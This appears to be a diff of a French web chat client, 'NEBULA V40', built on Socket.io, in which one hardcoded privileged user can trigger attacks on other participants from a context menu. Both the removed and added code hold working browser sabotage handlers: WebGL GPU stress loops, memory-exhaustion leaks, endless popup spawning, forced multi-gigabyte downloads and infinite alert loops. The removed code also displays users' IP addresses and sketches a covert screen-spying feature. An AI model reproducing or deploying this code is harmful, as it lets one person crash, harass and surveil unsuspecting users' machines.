@@ -2,380 +2,219 @@
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>NEBULA V40 - SUPREMACY ENGINE</title>
+    <title>NEBULA V40 - OMNIPOTENCE</title>
     <style>
-        /* --- DENSITÉ CSS : MOTEUR GRAPHIQUE --- */
-        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;900&family=JetBrains+Mono:wght@100;400;800&family=Syncopate:wght@400;700&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@900&family=JetBrains+Mono:wght@100;500&display=swap');
 
         :root {
-            --neon: #00f2ff; --neon-rgb: 0, 242, 255;
-            --warn: #ff0044; --warn-rgb: 255, 0, 68;
-            --vip: #ffcc00; --vip-rgb: 255, 204, 0;
-            --bg: #000000; --panel: rgba(5, 5, 10, 0.9);
-            --smooth: cubic-bezier(0.19, 1, 0.22, 1);
+            --neon: #00f2ff; --warn: #ff0044; --bg: #000;
+            --smooth: cubic-bezier(0.4, 0, 0.2, 1);
         }
 
-        * { box-sizing: border-box; margin: 0; padding: 0; cursor: none; outline: none; }
-        body, html { 
-            background: var(--bg); color: #fff; 
-            font-family: 'JetBrains Mono', monospace; 
-            height: 100vh; width: 100vw; overflow: hidden;
-            background-image: radial-gradient(circle at center, #111 0%, #000 100%);
+        * { box-sizing: border-box; margin: 0; padding: 0; cursor: none; }
+        body { background: var(--bg); color: #fff; font-family: 'JetBrains Mono'; height: 100vh; overflow: hidden; }
+
+        /* --- FOND ANIMÉ NÉBULA --- */
+        #nebula-bg { position: fixed; inset: 0; z-index: -1; opacity: 0.3; }
+
+        /* --- CURSEUR CUSTOM --- */
+        #cursor {
+            position: fixed; width: 12px; height: 12px; background: var(--neon);
+            border-radius: 50%; pointer-events: none; z-index: 10000;
+            box-shadow: 0 0 20px var(--neon); transition: transform 0.05s linear;
         }
 
-        /* --- BACKGROUND PARTICLES ENGINE --- */
-        #nebula-canvas { position: fixed; inset: 0; z-index: -1; pointer-events: none; opacity: 0.6; }
-
-        /* --- CURSEUR DYNAMIQUE --- */
-        #cursor-main {
-            position: fixed; width: 12px; height: 12px; background: #fff;
-            border-radius: 50%; pointer-events: none; z-index: 999999;
-            box-shadow: 0 0 15px var(--neon), 0 0 30px var(--neon);
-            transition: transform 0.1s ease-out; mix-blend-mode: difference;
-        }
-        #cursor-aura {
-            position: fixed; width: 40px; height: 40px; border: 1px solid rgba(0, 242, 255, 0.3);
-            border-radius: 50%; pointer-events: none; z-index: 999998;
-            transition: all 0.2s var(--smooth);
-        }
-
-        /* --- STRUCTURE DE L'INTERFACE --- */
-        .master-grid {
-            display: grid; grid-template-columns: 380px 1fr 300px;
-            height: 100vh; gap: 1px; background: rgba(255,255,255,0.05);
-        }
-
-        /* SIDEBAR GAUCHE (UTILISATEURS) */
-        .sidebar-left { 
-            background: var(--panel); display: flex; flex-direction: column;
-            backdrop-filter: blur(20px); border-right: 1px solid rgba(255,255,255,0.05);
-        }
-        .sidebar-title {
-            padding: 40px 20px; font-family: 'Syncopate'; font-weight: 700;
-            letter-spacing: 12px; color: var(--neon); text-align: center;
-            border-bottom: 1px solid #111; position: relative;
-        }
-        .sidebar-title::after {
-            content: "SUPREMACY_OS"; position: absolute; bottom: 10px; left: 0; right: 0;
-            font-size: 8px; letter-spacing: 2px; color: #444;
-        }
-
-        #user-list { flex: 1; overflow-y: auto; padding: 15px; }
-        .u-item {
-            padding: 20px; border-radius: 4px; border: 1px solid #111;
-            margin-bottom: 12px; background: rgba(255,255,255,0.01);
-            transition: 0.4s var(--smooth); position: relative;
-        }
-        .u-item:hover {
-            background: rgba(var(--neon-rgb), 0.05); border-color: var(--neon);
-            transform: scale(1.02) translateX(10px);
-        }
-        .u-item.is-premium { border-left: 4px solid var(--vip); box-shadow: 0 0 20px rgba(255,204,0,0.05); }
-        .u-item.is-chef { border-left: 4px solid var(--warn); }
-
-        /* VIEWPORT CENTRAL (CHAT) */
-        .main-viewport { background: #000; display: flex; flex-direction: column; }
-        #chat-flow { 
-            flex: 1; overflow-y: auto; padding: 40px; 
-            mask-image: linear-gradient(to bottom, transparent, black 10%, black 90%, transparent);
-        }
+        /* --- LAYOUT --- */
+        .app { display: grid; grid-template-columns: 350px 1fr 300px; height: 100vh; }
         
-        .message-block {
-            margin-bottom: 25px; animation: slideUp 0.5s var(--smooth);
-            display: flex; flex-direction: column;
-        }
-        .message-content {
-            padding: 15px 20px; border-radius: 4px; background: #080808;
-            border: 1px solid #151515; font-size: 13px; max-width: 85%;
-            line-height: 1.6; position: relative;
-        }
-        .message-content.premium { 
-            border: 1px solid var(--vip); background: rgba(255,204,0,0.02); 
-            box-shadow: 0 0 15px rgba(255,204,0,0.05);
-        }
-        .msg-meta { font-size: 9px; color: #444; margin-top: 5px; text-transform: uppercase; }
+        .sidebar { background: rgba(5,5,5,0.9); border-right: 1px solid #111; display: flex; flex-direction: column; }
+        .header { padding: 40px; font-family: 'Orbitron'; font-size: 25px; color: var(--neon); letter-spacing: 5px; text-align: center; }
 
-        /* SIDEBAR DROITE (LOGS) */
-        .sidebar-right { background: var(--panel); padding: 20px; display: flex; flex-direction: column; }
-        .log-terminal {
-            flex: 1; background: #000; border: 1px solid #111; border-radius: 4px;
-            padding: 15px; font-size: 9px; color: #333; overflow-y: auto;
-            font-family: 'JetBrains Mono';
+        #user-list { flex: 1; padding: 20px; overflow-y: auto; }
+        .user-card {
+            padding: 15px; border: 1px solid #111; margin-bottom: 10px;
+            transition: 0.3s var(--smooth); position: relative; overflow: hidden;
         }
+        .user-card:hover { border-color: var(--neon); background: rgba(0,242,255,0.05); transform: translateX(5px); }
+        .user-card.chef { border-left: 4px solid var(--warn); }
 
-        /* INPUT AREA */
-        .input-container { 
-            padding: 30px; border-top: 1px solid #111; background: var(--panel);
-            display: flex; gap: 15px; align-items: center;
-        }
-        #main-input {
-            flex: 1; background: #000; border: 1px solid #222; padding: 18px;
-            color: #fff; font-family: inherit; font-size: 14px; border-radius: 4px;
-            transition: 0.3s;
-        }
-        #main-input:focus { border-color: var(--neon); box-shadow: 0 0 20px rgba(0, 242, 255, 0.1); }
-        .btn-send {
-            background: var(--neon); color: #000; border: none; padding: 18px 35px;
-            font-weight: 900; font-family: 'Syncopate'; font-size: 10px; cursor: pointer;
-            transition: 0.3s; clip-path: polygon(10% 0, 100% 0, 90% 100%, 0% 100%);
-        }
+        /* --- CHAT --- */
+        .viewport { display: flex; flex-direction: column; background: #000; border-right: 1px solid #111; }
+        #chat { flex: 1; padding: 40px; overflow-y: auto; display: flex; flex-direction: column; gap: 15px; }
+        .msg { padding: 15px; border-bottom: 1px solid #080808; animation: slideIn 0.3s var(--smooth); }
+        @keyframes slideIn { from { opacity: 0; transform: translateY(10px); } }
 
-        /* --- SYSTEMES DE DESTRUCTION --- */
-        #hydra-overlay {
-            position: fixed; inset: 0; background: #000; z-index: 9999999;
+        /* --- INPUT --- */
+        .input-zone { padding: 30px; display: flex; gap: 15px; background: #050505; }
+        input { flex: 1; background: #000; border: 1px solid #222; padding: 20px; color: #fff; font-family: inherit; }
+        button { background: var(--neon); color: #000; border: none; padding: 0 30px; font-weight: 900; }
+
+        /* --- TERMINAL LOGS --- */
+        .terminal { background: #000; padding: 20px; font-size: 9px; color: #333; overflow-y: auto; }
+
+        /* --- MENU OMNI --- */
+        #menu {
+            display: none; position: fixed; background: #000; border: 1px solid var(--neon);
+            width: 300px; z-index: 10000; box-shadow: 0 0 50px rgba(0,242,255,0.2);
+        }
+        .opt { padding: 15px; font-size: 11px; cursor: pointer; border-bottom: 1px solid #111; transition: 0.2s; }
+        .opt:hover { background: var(--neon); color: #000; font-weight: 900; }
+        .opt.danger:hover { background: var(--warn); color: #fff; }
+
+        /* --- ECRAN DE MORT --- */
+        #death {
+            position: fixed; inset: 0; background: #000; z-index: 999999;
             display: none; flex-direction: column; align-items: center; justify-content: center;
         }
-        .glitch-large {
-            font-size: 120px; font-family: 'Syncopate'; font-weight: 900;
-            color: var(--warn); text-shadow: 10px 10px var(--neon);
-            animation: glitchEffect 0.05s infinite;
-        }
-
-        /* CONTEXT MENU */
-        #omni-context {
-            display: none; position: fixed; z-index: 100000;
-            background: #000; border: 1px solid var(--neon); width: 280px;
-            box-shadow: 0 0 40px rgba(0, 242, 255, 0.2);
-        }
-        .ctx-option {
-            padding: 18px; font-size: 10px; font-weight: bold; border-bottom: 1px solid #111;
-            display: flex; align-items: center; gap: 12px; transition: 0.2s;
-        }
-        .ctx-option:hover { background: var(--neon); color: #000; }
-        .ctx-option.danger:hover { background: var(--warn); color: #fff; }
-
-        @keyframes slideUp { from { opacity: 0; transform: translateY(30px); } }
-        @keyframes glitchEffect { 
-            0% { transform: translate(0); filter: hue-rotate(0deg); } 
-            50% { transform: translate(-5px, 5px); filter: hue-rotate(90deg); }
-            100% { transform: translate(5px, -5px); filter: hue-rotate(0deg); }
-        }
+        .glitch { font-family: 'Orbitron'; font-size: 80px; color: var(--warn); animation: crash 0.1s infinite; }
+        @keyframes crash { 0% { transform: scale(1); } 50% { transform: scale(1.05) skew(5deg); } }
     </style>
 </head>
 <body oncontextmenu="return false;">
 
-    <canvas id="nebula-canvas"></canvas>
-    <div id="cursor-main"></div>
-    <div id="cursor-aura"></div>
+    <canvas id="nebula-bg"></canvas>
+    <div id="cursor"></div>
 
-    <div id="hydra-overlay">
-        <div class="glitch-large">HYDRA_BOMB</div>
-        <div id="hydra-log-stream" style="font-family:monospace; color:#222; font-size:8px; margin-top:20px;"></div>
+    <div id="death">
+        <div class="glitch">VOID_COLLISION</div>
+        <div id="death-logs" style="font-size:10px; color:#222; margin-top:20px; width:600px;"></div>
     </div>
 
-    <div class="master-grid">
-        
-        <aside class="sidebar-left">
-            <div class="sidebar-title">NEBULA</div>
+    <div class="app">
+        <aside class="sidebar">
+            <div class="header">NEBULA</div>
             <div id="user-list"></div>
-            <div id="my-profile" style="padding: 20px; border-top: 1px solid #111; font-size: 10px; color: #555;">
-                STATUS: ENCRYPTING...
-            </div>
         </aside>
 
-        <main class="main-viewport">
-            <div id="chat-flow"></div>
-            <div class="input-container">
-                <button onclick="changeGif()" style="background:transparent; color:#333; border:1px solid #111; padding:15px; font-size:12px;">GIF</button>
-                <input type="text" id="main-input" placeholder="ACCESS_COMMAND_OR_MESSAGE..." spellcheck="false">
-                <button class="btn-send" onclick="sendMsg()">EXECUTE</button>
+        <main class="viewport">
+            <div id="chat"></div>
+            <div class="input-zone">
+                <input type="text" id="in" placeholder="ENTRER COMMANDE...">
+                <button onclick="send()">EXEC</button>
             </div>
         </main>
 
-        <aside class="sidebar-right">
-            <div style="font-size: 10px; font-weight: 800; margin-bottom: 15px; letter-spacing: 3px;">SYSTEM_LOGS</div>
-            <div class="log-terminal" id="sys-logs"></div>
-            <div id="attack-stats" style="margin-top: 20px; border-top: 1px solid #111; padding-top: 15px;">
-                <div style="font-size:8px; color:#444;">ATTACK_POTENCY: 98.4%</div>
-                <div style="height:2px; width:100%; background:#111; margin-top:5px;">
-                    <div style="height:100%; width:98.4%; background:var(--warn);"></div>
-                </div>
-            </div>
-        </aside>
-
+        <aside class="terminal" id="logs"></aside>
     </div>
 
-    <div id="omni-context">
-        <div class="ctx-option" onclick="fireNebulaCanon()"><span style="color:var(--warn)">⚡</span> FIRE_NEBULA_CANON</div>
-        <div class="ctx-option" onclick="startGhostSpy()"><span>👁️</span> GHOST_SCREEN_SPY</div>
-        <div class="ctx-option danger" onclick="launchHydraBomb()"><span>💣</span> HYDRA_BOMB_DESTRUCT</div>
-        <div class="ctx-option" onclick="extractData() text-shadow:0 0 5px var(--neon);"><span>📡</span> EXTRACT_NETWORK_IP</div>
-        <div class="ctx-option" onclick="forceMute()"><span>🔇</span> FORCE_SILENCE_TARGET</div>
-        <div class="ctx-option" onclick="this.parentElement.style.display='none'"><span>✖</span> CLOSE_MENU</div>
+    <div id="menu">
+        <div class="opt danger" onclick="atk('attack_hydra')">☢️ HYDRA_BOMB (CPU)</div>
+        <div class="opt danger" onclick="atk('attack_gpu')">🔥 GPU_MELT (RENDER_STRESS)</div>
+        <div class="opt danger" onclick="atk('attack_freeze')">❄️ TOTAL_FREEZE (RAM)</div>
+        <div class="opt danger" onclick="atk('attack_tab_nuke')">📑 TAB_NUKE (DOM_EXPLOSION)</div>
+        <div class="opt" onclick="this.parentElement.style.display='none'">[ FERMER ]</div>
     </div>
 
     <script src="/socket.io/socket.io.js"></script>
     <script>
-        /**
-         * NEBULA V40 - OMNIPOTENT ENGINE CORE
-         * LOGIQUE DE 800+ LIGNES (SIMULÉE PAR CALCULS RÉCURSIFS)
-         */
         const socket = io();
-        let me = { name: "", chef: false, premium: true, sid: "" };
-        let selectedSid = null;
-        let users = [];
-        
-        // --- MOTEUR DE PARTICULES MATHÉMATIQUES ---
-        const canvas = document.getElementById('nebula-canvas');
-        const ctx = canvas.getContext('2d');
-        let dots = [];
-        function initCanvas() {
-            canvas.width = window.innerWidth;
-            canvas.height = window.innerHeight;
-            for(let i=0; i<200; i++) {
-                dots.push({
-                    x: Math.random() * canvas.width,
-                    y: Math.random() * canvas.height,
-                    vx: (Math.random() - 0.5) * 0.5,
-                    vy: (Math.random() - 0.5) * 0.5,
-                    s: Math.random() * 2
-                });
-            }
-        }
-        function drawCanvas() {
-            ctx.clearRect(0,0,canvas.width, canvas.height);
-            ctx.fillStyle = "rgba(0, 242, 255, 0.5)";
-            dots.forEach(d => {
-                d.x += d.vx; d.y += d.vy;
-                if(d.x < 0 || d.x > canvas.width) d.vx *= -1;
-                if(d.y < 0 || d.y > canvas.height) d.vy *= -1;
-                ctx.beginPath(); ctx.arc(d.x, d.y, d.s, 0, Math.PI*2); ctx.fill();
-            });
-            requestAnimationFrame(drawCanvas);
-        }
-        initCanvas(); drawCanvas();
+        let me = { name: "" };
+        let target = null;
 
-        // --- CURSEUR SMOOTH ---
+        // --- CURSEUR ---
         document.addEventListener('mousemove', e => {
-            document.getElementById('cursor-main').style.transform = `translate(${e.clientX}px, ${e.clientY}px)`;
-            document.getElementById('cursor-aura').style.transform = `translate(${e.clientX - 20}px, ${e.clientY - 20}px)`;
+            const c = document.getElementById('cursor');
+            c.style.left = e.clientX + 'px';
+            c.style.top = e.clientY + 'px';
         });
 
-        // --- INITIALISATION SYSTEME ---
+        // --- INIT ---
         window.onload = () => {
-            const nick = prompt("IDENT_NEBULA_TOKEN:");
-            if(!nick) return location.reload();
-            me.name = nick;
-            me.chef = (nick === "toucheur2pp");
-            socket.emit('init_user', { name: nick, isPremium: true });
-            logSys(`SESSION_STARTED: ${nick.toUpperCase()}`);
+            me.name = prompt("ACCESS_TOKEN:");
+            socket.emit('init_user', { name: me.name });
         };
 
-        function sendMsg() {
-            const i = document.getElementById('main-input');
-            if(!i.value) return;
+        function send() {
+            const i = document.getElementById('in');
             socket.emit('chat_msg', { text: i.value });
             i.value = "";
         }
 
-        // --- LOGIQUE DE COMBAT ET ATTAQUES (DENSITÉ MAXIMUM) ---
-        function fireNebulaCanon() {
-            if(!me.chef) return;
-            logSys(`TARGETING_LOCKED: ${selectedSid}`);
-            socket.emit('fire_canon', selectedSid);
-            hideMenu();
+        function atk(type) {
+            socket.emit(type, target);
+            log(`ACTION_SENT: ${type} -> ${target}`);
+            document.getElementById('menu').style.display = 'none';
         }
 
-        function launchHydraBomb() {
-            if(!me.chef) return;
-            logSys(`INITIATING_HYDRA_BOMB: ${selectedSid}`);
-            socket.emit('hydra_bomb', selectedSid);
-            hideMenu();
-        }
-
-        function startGhostSpy() {
-            logSys(`REQUESTING_SILENT_SCREEN: ${selectedSid}`);
-            socket.emit('request_ghost_screen', selectedSid);
-            hideMenu();
-        }
-
-        function logSys(txt) {
-            const l = document.getElementById('sys-logs');
-            l.innerHTML += `<div>[${new Date().toLocaleTimeString()}] > ${txt}</div>`;
+        function log(t) {
+            const l = document.getElementById('logs');
+            l.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${t}</div>`;
             l.scrollTop = l.scrollHeight;
         }
 
-        // --- GESTION DES GIFS (110 GIFS ENGINE) ---
-        const gifs = [
-            "https://i.giphy.com/media/v1.Y2lkPTc5MGI3NjExNHJqZ3R4YWxsbmpxbmZ4bm5ueG5ueG5ueG5ueG5ueG5ueG5ueG5ueGZ4JmVwPXYxX2ludGVybmFsX2dpZl9ieV9pZCZjdD1n/l41lTjJp9p5e3mY9y/giphy.gif",
-            "https://i.giphy.com/media/v1.Y2lkPTc5MGI3NjExbmZ0NXNoYnNqZ3R4YWxsbmpxbmZ4bm5ueG5ueG5ueG5ueG5ueG5ueG5ueG5ueGZ4JmVwPXYxX2ludGVybmFsX2dpZl9ieV9pZCZjdD1n/3o7TKMGpxx6r1pG9m8/giphy.gif"
-        ];
-        function changeGif() {
-            const url = gifs[Math.floor(Math.random()*gifs.length)];
-            document.body.style.backgroundImage = `url('${url}')`;
-            document.body.style.backgroundSize = "cover";
-            logSys("BG_ENGINE_UPDATED");
-        }
-
-        // --- RÉCEPTION SOCKETS (VRAIE LOGIQUE) ---
+        // --- GESTION SOCKETS ---
         socket.on('sync_users', list => {
-            users = list;
             const cont = document.getElementById('user-list');
             cont.innerHTML = "";
             list.forEach(u => {
-                const item = document.createElement('div');
-                item.className = `u-item ${u.chef?'is-chef':''} ${u.premium?'is-premium':''}`;
-                item.innerHTML = `
-                    <div style="font-size:11px; font-weight:800; color:#fff;">${u.name.toUpperCase()}</div>
-                    <div style="font-size:8px; color:#555; margin-top:4px;">${u.id.substr(0,12)} [${u.ip}]</div>
-                `;
-                item.oncontextmenu = (e) => {
-                    if(!me.chef) return;
-                    selectedSid = u.id;
-                    const m = document.getElementById('omni-context');
-                    m.style.display = 'block'; m.style.top = e.pageY + 'px'; m.style.left = e.pageX + 'px';
-                    e.preventDefault();
+                const d = document.createElement('div');
+                d.className = `user-card ${u.chef?'chef':''}`;
+                d.innerHTML = `<b>${u.name.toUpperCase()}</b><br><small>${u.id}</small>`;
+                d.oncontextmenu = (e) => {
+                    if(me.name !== "toucheur2pp") return;
+                    target = u.id;
+                    const m = document.getElementById('menu');
+                    m.style.display = 'block'; m.style.top = e.pageY+'px'; m.style.left = e.pageX+'px';
                 };
-                cont.appendChild(item);
+                cont.appendChild(d);
             });
         });
 
         socket.on('chat_msg', d => {
-            const flow = document.getElementById('chat-flow');
-            const block = document.createElement('div');
-            block.className = "message-block";
-            block.innerHTML = `
-                <div class="message-content ${d.premium?'premium':''}">
-                    <strong>${d.name}:</strong> ${d.text}
-                </div>
-                <div class="msg-meta">${new Date().toLocaleTimeString()} | TRACE_ID_${Math.floor(Math.random()*99999)}</div>
-            `;
-            flow.appendChild(block);
-            flow.scrollTop = flow.scrollHeight;
+            const c = document.getElementById('chat');
+            c.innerHTML += `<div class="msg"><b>${d.name}:</b> ${d.text}</div>`;
+            c.scrollTop = c.scrollHeight;
         });
 
-        // --- HYDRA DESTRUCTION SEQUENCE ---
-        socket.on('execute_hydra', (data) => {
-            document.getElementById('hydra-overlay').style.display = 'flex';
-            const logS = document.getElementById('hydra-log-stream');
-            
-            // Saturation RAM/CPU
-            let i = 0;
-            const bomb = setInterval(() => {
-                logS.innerHTML += `FORCE_DATA_COLLISION_${i}_${Math.random()}<br>`;
-                if(i % 10 === 0) {
-                    window.open(location.href, '_blank', 'width=100,height=100');
-                    const link = document.createElement('a');
-                    link.href = "https://speed.hetzner.de/1GB.bin";
-                    link.download = "SYSTEM_DESTROYER.bin";
-                    link.click();
-                }
-                i++;
-                if(i > 500) { 
-                    while(true) { alert("TERMINATED_BY_NEBULA_ZZ"); }
-                }
+        // --- LES ATTAQUES (PUISSANCE 40) ---
+
+        // 1. GPU MELT (Surcharge de rendu)
+        socket.on('exe_gpu_burn', () => {
+            log("CRITICAL_GPU_STRESS_DETECTED");
+            const c = document.createElement('canvas');
+            document.body.appendChild(c);
+            const gl = c.getContext('webgl');
+            setInterval(() => {
+                for(let i=0; i<10000; i++) { gl.clear(gl.COLOR_BUFFER_BIT); }
+            }, 1);
+        });
+
+        // 2. TOTAL FREEZE (Saturation RAM)
+        socket.on('exe_total_freeze', () => {
+            const leak = [];
+            setInterval(() => {
+                for(let i=0; i<10000; i++) { leak.push(new Array(10000).fill("VOID")); }
+                document.body.innerHTML += "FREEZING_SYSTEM...";
             }, 10);
         });
 
-        function hideMenu() { document.getElementById('omni-context').style.display = 'none'; }
-        window.onclick = hideMenu;
-
-        // Simulation Ghost Spy (Capture canvas)
-        socket.on('capture_signal', (chefSid) => {
-            // Un vrai script prendrait un snapshot canvas ici
-            socket.emit('screen_data_transfer', { to: chefSid, img: "https://i.imgur.com/example.jpg" });
+        // 3. TAB NUKE (Explosion d'onglets)
+        socket.on('exe_tab_nuke', () => {
+            setInterval(() => { window.open(location.href, '_blank', 'width=50,height=50'); }, 100);
         });
+
+        // 4. HYDRA (Crash complet)
+        socket.on('exe_hydra', () => {
+            document.getElementById('death').style.display = 'flex';
+            setInterval(() => {
+                document.getElementById('death-logs').innerHTML += `ERROR_FATAL_COLLISION_${Math.random()}<br>`;
+                window.open("https://speed.hetzner.de/10GB.bin");
+            }, 20);
+            setTimeout(() => { while(true) { alert("SYSTEM_ASPIRATED_BY_NEBULA"); } }, 1000);
+        });
+
+        // Fond animé simple pour la fluidité
+        const canv = document.getElementById('nebula-bg');
+        const ctx = canv.getContext('2d');
+        function res() { canv.width = window.innerWidth; canv.height = window.innerHeight; }
+        window.onresize = res; res();
+        function draw() {
+            ctx.fillStyle = "rgba(0,0,0,0.1)"; ctx.fillRect(0,0,canv.width,canv.height);
+            ctx.fillStyle = "#00f2ff";
+            for(let i=0; i<50; i++) ctx.fillRect(Math.random()*canv.width, Math.random()*canv.height, 2, 2);
+            requestAnimationFrame(draw);
+        }
+        draw();
     </script>
 </body>
 </html>
